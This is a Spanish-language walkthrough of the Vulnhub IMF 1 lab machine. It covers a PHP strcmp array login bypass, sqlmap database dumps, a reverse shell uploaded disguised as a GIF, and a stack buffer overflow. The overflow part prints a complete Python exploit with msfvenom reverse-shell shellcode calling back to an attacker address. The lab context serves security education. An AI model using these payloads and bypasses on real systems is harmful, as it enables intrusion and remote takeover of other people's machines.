---
title: IMF 1 - Vulnhub
layout: page
permalink: /writeups/vulnhub/imf1
date: 2025-04-05 11:00:00 -0000
categories: [Laboratorios]
tags: [Vulnhub]
description: >
  Write up en español para IMF 1 - Vulnhub
pin: false  
toc: true   
math: false 
mermaid: false 
---

IMF es una agencia de inteligencia que debes hackear para conseguir todas las flags y, finalmente, obtener acceso root. Las banderas comienzan siendo fáciles y se vuelven más difíciles a medida que avanzas. Cada bandera contiene una pista para encontrar la siguiente.

## Escaneo de puertos

```bash
nmap -sS -Pn -T4 -O 192.168.100.98
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-05 16:34 CEST
Nmap scan report for 192.168.100.98
Host is up (0.00032s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE
80/tcp open  http
MAC Address: BC:24:11:C3:D8:1D (Proxmox Server Solutions GmbH)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.11 (93%), Linux 3.13 - 4.4 (93%), Linux 3.16 - 4.6 (93%), Linux 3.2 - 4.14 (93%), Linux 3.8 - 3.16 (93%), Linux 4.4 (93%), Linux 3.13 (90%), Linux 3.18 (89%), Linux 4.2 (89%), Linux 3.16 (87%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
```

## Visitando el sitio web

![alt text](/assets/img/writeups/vulnhub/imf1/image.png)

Visitando el website y explorando el codigo fuente HTML vamos a encontrar la primera pista encodeada en base64.

![alt text](/assets/img/writeups/vulnhub/imf1/image-1.png)

Nos indica una pista para encontrar la segunda bandera `allthefiles`, puede indicar que debemos revisar todos los documentos que se cargan en el sitio web.

## Segunda flag

En los recursos encontramos tres archivos js que parecen sospechosos.

![alt text](/assets/img/writeups/vulnhub/imf1/image-2.png)

Si los intentamos decodificar de forma individual no tienen ningun sentido pero vamos a intentar decodificarlos juntos.

```plaintext
ZmxhZzJ7YVcxbVlXUnRhVzVwYzNSeVlYUnZjZz09fQ==
```

![alt text](/assets/img/writeups/vulnhub/imf1/image-3.png)

## Tercera flag

Parece un nombre de usuario o ruta.

Si navegamos a esta nos muestra un login y si revisamos el código fuente encontramos un comentario diciendo que la contraseña de la base de datos está `hardcoded` lo que indica que se encuentra escrita en el código fuente.

![alt text](/assets/img/writeups/vulnhub/imf1/image-4.png)

Por ahora no parece que tengamos usuarios válido aunque si nos fijamos tenemos validación en el login si el usuario es valido o no.

![alt text](/assets/img/writeups/vulnhub/imf1/image-5.png)

Por lo que podemos probar con algunos de los correos que encontramos en `contact.php`.

![alt text](/assets/img/writeups/vulnhub/imf1/image-6.png)

![alt text](/assets/img/writeups/vulnhub/imf1/image-7.png)

Por lo que tenemos nombres de usuario válidos.

Ahora que sabemos esto junto con la indicación de que no existe una base de datos en el backend significa que la validación del usuario se está haciendo en el código PHP. 
Buscando las funciones de PHP posibles para comparar strings tenemos [strcmp](https://www.php.net/manual/en/function.strcmp.php).

- Ejemplo:

```php
$var1 = "Hello";
$var2 = "hello";
if (strcmp($var1, $var2) !== 0) {
    echo '$var1 is not equal to $var2 in a case sensitive string comparison';
}
```

La función strcmp($a, $b) devuelve:

    - 0 si $a === $b (es decir, son exactamente iguales con sensibilidad a mayúsculas/minúsculas),

    - un valor distinto de 0 si no son iguales.

Este código evalúa que no son iguales porque "Hello" y "hello" tienen diferente mayúscula.

Si un login en PHP hace algo como:

```php
if (strcmp($_POST['password'], 'secreta123') === 0) {
    // acceso permitido
}
```

Entonces necesitamos que strcmp($_POST['password'], 'secreta123') === 0 se evalúe como true sin saber la contraseña.

### Bypass clásico: Tipo de dato inesperado

strcmp() espera strings, pero PHP no lanza error si pasas otro tipo. Esto se puede aprovechar.

- Inyectar un array

```php
$_POST['password'] = [];
```

Esto da error como:
```php
Warning: strcmp() expects parameter 1 to be string, array given
```

Pero si hay un @ antes (para suprimir errores), como:

```php
if (@strcmp($_POST['password'], 'secreta123') === 0)
```

PHP devuelve false silenciosamente ya que algunos devs comparan con !== 0 y asumen que cualquier otra cosa es acceso válido.

![alt text](/assets/img/writeups/vulnhub/imf1/image-8.png)

Esto funciona porque strcmp() espera dos strings pero hemos modificado el parámetro pass a un array `strcmp(array('test'), 'contraseña_correcta');` lo que lanza una advertencia como:

> Warning: strcmp() expects parameter 1 to be string, array given

Pero si el código tiene un @ PHP suprime el warning y simplemente devuelve `false` y `false !== 0` es verdadero.

La flag indica que continuemos al CMS.

## Cuarta flag

En este CMS tenemos diferentes páginas que se obtienen a través GET por URL.

![alt text](/assets/img/writeups/vulnhub/imf1/image-9.png)

Es por tanto susceptible a SQLi.

![alt text](/assets/img/writeups/vulnhub/imf1/image-10.png)

```bash
sqlmap -u "http://192.168.100.98/imfadministrator/cms.php?pagename=home" --cookie "PHPSESSID=qmbhopabov8a6qco31fbe5vuc2" --batch --dbs
```

![alt text](/assets/img/writeups/vulnhub/imf1/image-11.png)

Obtenemos las tablas de la base de datos.

```bash
sqlmap -u "http://192.168.100.98/imfadministrator/cms.php?pagename=home" --cookie "PHPSESSID=qmbhopabov8a6qco31fbe5vuc2" --batch -D admin --tables
```

![alt text](/assets/img/writeups/vulnhub/imf1/image-12.png)

Volcamos los datos de la tabla `pages`.

```bash
sqlmap -u "http://192.168.100.98/imfadministrator/cms.php?pagename=home" --cookie "PHPSESSID=qmbhopabov8a6qco31fbe5vuc2" --batch -D admin -T pages --dump
```

![alt text](/assets/img/writeups/vulnhub/imf1/image-13.png)

Vemos que una de ellas no es visible en la web renderizada. Vamos a acceder directamente a ella.

![alt text](/assets/img/writeups/vulnhub/imf1/image-14.png)

![alt text](/assets/img/writeups/vulnhub/imf1/image-15.png)

![alt text](/assets/img/writeups/vulnhub/imf1/image-16.png)

## Quinta flag

Visitamos el documento que nos indica la flag.

Podemos subir archivos por lo que probamos directamente con una shell.

![alt text](/assets/img/writeups/vulnhub/imf1/image-17.png)

Filtra el archivo, vamos a intentar hacer un bypass. 

![alt text](/assets/img/writeups/vulnhub/imf1/image-18.png)

Parece filtrar tambien el MIME type de los archivos, vamos a buscar por bypass de ciertos MIME types que no filtre de forma eficiente.

Encontramos que el filtro para GIF es débil y, además que cuenta con un WAF que filtra ciertos tipos de strings en el archivo.

![alt text](/assets/img/writeups/vulnhub/imf1/image-19.png)

Por lo que finalmente conseguimos subir una shell camuflada como GIF modificando el reverse shell y el nombre del archivo. Luego podemos ver un comentario con ciertos valores, esto puede ser el nombre que se le da al archivo para evitar subir archivos con el mismo nombre.

Ahora nos toca encotnrar el lugar donde se suben estos archivos.

![alt text](/assets/img/writeups/vulnhub/imf1/image-20.png)

La dirección `uploads` indica 403 Forbidden por lo que existe aunque no se puede acceder directamente.

Ahora antes de ejecutar el archivo vamos a poner un puerto de escucha para recibir la shell.

```bash
nc -lvnp 4444
```

![alt text](/assets/img/writeups/vulnhub/imf1/image-21.png)

![alt text](/assets/img/writeups/vulnhub/imf1/image-22.png)

Estabilizamos la shell.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z
stty raw -echo; fg
Enter
export TERM=xterm
```

![alt text](/assets/img/writeups/vulnhub/imf1/image-23.png)

## Sexta flag

La flag indica algo sobre los servicios así que vamos a buscarlos.

```bash
netstat -tulnp
```

![alt text](/assets/img/writeups/vulnhub/imf1/image-24.png)

Vemos diferentes servicios que pueden ser interesantes.

Como tenemos la shell estable y completamente interactiva podemos conectarnos al servicio desde ella.

```bash
nc 127.0.0.1 7788
```

![alt text](/assets/img/writeups/vulnhub/imf1/image-25.png)

Tenemos un binario que en principio no sabemos nada sobre él ni como se llama, vamos a buscar en los archivos del sistema para ver su ubicación y como se llama.

Lo normal es que cuando se sirve un binario mediante un puerto, este no esté siempre ejecutado esperando inputs sino que se espera a una conexión para ser ejecutado. Esto se hace mediante xinetd.d.

### xinetd (eXtended InterNET Daemon)

xinetd (eXtended InterNET Daemon) es un "super servidor" en sistemas Linux que administra y lanza servicios bajo demanda.

En vez de tener varios servicios escuchando todo el tiempo (como un servidor FTP, un daemon para escaneo, o un binario personalizado), xinetd se encarga de:

- Escuchar puertos

- Esperar conexiones

- Cuando llega una conexión, lanzar el binario que corresponde

- Cerrar el binario cuando termina (si así se configura)

Su configuración se encuentra en `/etc/xinetd.d/`.

![alt text](/assets/img/writeups/vulnhub/imf1/image-26.png)

Lo que nos interesa principalmente es el agente. La ubicación del binario es `/usr/local/bin/agent`.

```bash
strings /usr/local/bin/agent
```

### Puntos potenciales de vulnerabilidad

```makefile
Location: %s
Report: %s
```

Está usando `printf()` (o funciones similares) para imprimir entradas del usuario con formatos como %s por lo que podríamos inyectar cosas como %x %x %x y eventualmente leer la pila o incluso escribir en memoria (con %n).

Ahora para obtener más información sobre las llamadas que realiza vamos a usar `ltrace`.

**ltrace** permite observar llamadas a funciones de librerías dinámicas (como libc), a diferencia de **strace** que muestra llamadas al sistema operativo (como open, read, etc.).

Te permite ver qué funciones como printf, fgets, strcmp, system, etc., están siendo llamadas y con qué argumentos.

```bash
ltrace /usr/local/bin/agent
```

![alt text](/assets/img/writeups/vulnhub/imf1/image-27.png)

Las partes que nos interesan son las siguientes:

```bash
printf("\nAgent ID : ") = 12
fgets("\n", 9, 0xf778b5a0) = 0xff86ce4e
```

Aquí es donde el binario te pide que ingreses tu Agent ID. Si pulsamos enter lo dejamos vacío.

```bash
strncmp("\n", "48093572", 8) = -1
```

Aquí es donde compara el Agent ID que ingresamos con el real por lo que ahora sabemos el ID.

![alt text](/assets/img/writeups/vulnhub/imf1/image-28.png)

Ahora podemos buscar el parámetro del binario donde se produce el overflow.

![alt text](/assets/img/writeups/vulnhub/imf1/image-29.png)

### Explotación del overflow

Creamos un patrón único para detectar el offset de forma precisa.

![alt text](/assets/img/writeups/vulnhub/imf1/image-30.png)

Este patrón lo vamos a enviar como "report update" (opción 3 del menú), y luego buscar qué valor pisa EIP.

Antes de continuar vamos a exportar el binario a nuestro sistema.

```bash
cat agent| base64 -w 0

# En kali

cat agent.txt| base64 --decode > agent
chmod +x agent
```

![alt text](/assets/img/writeups/vulnhub/imf1/image-31.png)

Ahora para el debugging vamos a usar `gdb`.

```bash
gdb -q agent

# En gbd
run
3
# Pegamos el patrón
```

![alt text](/assets/img/writeups/vulnhub/imf1/image-32.png)

Ahora debemos calcular el offset de la dirección de retorno.

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 41366641
```

![alt text](/assets/img/writeups/vulnhub/imf1/image-33.png)

Eso indica que el byte 169 es donde comienza EIP.

Ahora necesitamos la dirección hacia donde debemos saltar.

Para ello vamos a usar una función de ensamblador x86 llamada `call eax` que nos permite saltar a una dirección de memoria.

Oficialmente se reconoce el [opcode](http://ref.x86asm.net/coder32.html) de **call eax** como `ff d0`.

Es el opcode en hexadecimal de la instrucción de ensamblador y es como la CPU reconoce a esa instrucción como bytes.

```bash
objdump -d ./agent | grep "ff d0"
```

![alt text](/assets/img/writeups/vulnhub/imf1/image-35.png)

O mediante ROPgadegt

```bash
ROPgadget --binary ./agent | grep 'call eax'
```

![alt text](/assets/img/writeups/vulnhub/imf1/image-36.png)

Tenemos que usarlo en bytecode little endian.

```plaintext
eip = b"\x63\x85\x04\x08"  # <- 0x08048563 (call eax)
```

Sabiendo esto vamos a necesitar un payload shellcode para que se ejecute en la dirección de retorno.

```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.100.210 LPORT=9999 -f python -b "\x00\x0a\x0d"
```
- -b "\x00\x0a\x0d" evita caracteres nulos, newline y carriage return que romperían el exploit.

Ahora creamos el exploit.

```bash
cat << EOF > exploit.py
import socket

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(('127.0.0.1', 7788))
client.recv(1024)

client.send(b"48093572\n")
client.recv(1024)
client.send(b"3\n")
client.recv(1024)

buf =  b""
buf += b"\xba\x97\x99\x0b\x4c\xdb\xc5\xd9\x74\x24\xf4\x5e"
buf += b"\x33\xc9\xb1\x12\x31\x56\x12\x03\x56\x12\x83\x79"
buf += b"\x65\xe9\xb9\xb4\x4d\x19\xa2\xe5\x32\xb5\x4f\x0b"
buf += b"\x3c\xd8\x20\x6d\xf3\x9b\xd2\x28\xbb\xa3\x19\x4a"
buf += b"\xf2\xa2\x58\x22\xc5\xfd\xff\x60\xad\xff\xff\xa3"
buf += b"\x21\x89\xe1\x1b\x5b\xd9\xb0\x08\x17\xda\xbb\x4f"
buf += b"\x9a\x5d\xe9\xe7\x4b\x71\x7d\x9f\xfb\xa2\xae\x3d"
buf += b"\x95\x35\x53\x93\x36\xcf\x75\xa3\xb2\x02\xf5"

# NOP sled + EIP overwrite
buf += b"\x90" * (168 - len(buf)) + b"\x63\x85\x04\x08\n"

client.send(buf)

print("\n=== PAYLOAD SENT. CHECK YOUR HANDLER ===")

EOF
```

![alt text](/assets/img/writeups/vulnhub/imf1/image-34.png)

## Resumen de explotación del binario

Un **binario vulnerable** llamado `agent` que corre en un servicio local (puerto **7788**) y muestra un menú textual:

```
Agent ID : 
Main Menu:
1. Extraction Points
2. Request Extraction
3. Submit Report
```

Cuando entras en la opción 3, el programa **te permite escribir un reporte**, y aquí es donde ocurre **el overflow**.

### ¿Qué vulnerabilidad se está explotando?

#### → **Buffer Overflow (Desbordamiento de búfer)**

Este bug clásico ocurre cuando el programa **te deja escribir más datos de los que puede manejar** internamente. Si aprovechas esto, puedes:

- Sobrescribir **EIP** (registro de instrucción)
- Hacer que el programa **salte a una dirección que tú controles**
- Y que ejecute **tu código (shellcode)**

### ¿Dónde ocurre el overflow?

En la opción `3. Submit Report`, el programa internamente tiene algo como:

```c
char buffer[128];
gets(buffer);  // o scanf / fgets mal usado
```

Tú envías un string MUY largo → el contenido **se desborda en la pila (stack)** → termina **pisando el EIP**, que es el registro que indica **a dónde salta el programa al ejecutar**.

### ¿Qué es EIP?

- Es el **registro de instrucciones** del procesador
- Cuando lo sobrescribes, puedes **decidir a dónde va el programa**
- Normalmente salta a una dirección de código → hacemos que salte a tu shellcode 

### ¿Qué necesitas para hacer el ataque?

#### Saber **cuántos bytes** necesitas para llegar a EIP  
(→ lo hacemos con `pattern_create.rb`)

Ejemplo: `168` bytes

#### Un **shellcode**

El shellcode es un bloque de código que hace algo útil (por ejemplo: reverse shell, meterpreter, etc.). Lo creamos con:

```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=tu_ip LPORT=tu_puerto -f python -b "\x00\x0a\x0d"
```

#### Una dirección válida para el salto  
(→ una instrucción como `jmp esp` dentro del binario o alguna librería)

Ejemplo: `0x08048563` ( lo encontramos con `ROPgadget`)

#### Un **payload construido así**:

```
[relleno hasta EIP][EIP][shellcode]
```

En el código python:

```python
buf = shellcode
padding = b"A" * (offset - len(buf) - len(nops))
payload = padding + nops + buf + eip
```

El NOPs `b"\x90" * (168 - len(buf))` son para **rellenar el espacio** que falta para llegar hasta la dirección EIP. Justo después reemplazamos el contenido con la llamada a la función `call eax` e inmediatamente después inyectamos el shellcode.

`b"\x63\x85\x04\x08"` es la dirección que va a reemplazar EIP (en formato little-endian).

`0x08048563` es una dirección dentro del binario

En este caso, es una instrucción call eax, es decir: salta a al shellcode

Se pone después de los 168 bytes de relleno porque es el contenido que irá a parar al EIP

### ¿Qué hace el exploit paso a paso?

1. Se conecta al servicio `agent` por el puerto 7788
2. Envía el Agent ID correcto (`48093572`)
3. Selecciona la opción 3 del menú
4. En lugar de enviar un texto normal, **envía el payload malicioso**
5. El programa procesa el input, se desborda y **EIP se sobrescribe**
6. Cuando intenta retornar, **salta a la dirección que pusiste en EIP**
7. Esa dirección apunta al **shellcode** (que colocamos justo antes)
8. El shellcode se ejecuta y nos da **una shell reversa**
